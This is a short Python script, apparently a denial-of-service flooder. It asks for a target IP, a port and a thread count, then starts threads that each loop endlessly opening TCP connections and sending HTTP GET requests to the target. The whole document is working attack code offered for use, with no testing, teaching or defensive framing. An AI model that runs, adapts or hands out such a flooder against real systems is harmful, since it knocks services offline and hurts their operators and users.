import socket
import threading
port = int(input("Insert Port: "))
IP = input("Target IP: ")
Trd = int(input("Insert number of Threads: "))
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, port))
        s.send(("GET /" + IP + " HTTP/1.1\r\n").encode())
        s.send(("Host: " + IP + "\r\n\r\n").encode())
        s.close()
for i in range(Trd):
        thread = threading.Thread(target=attack)
        thread.start()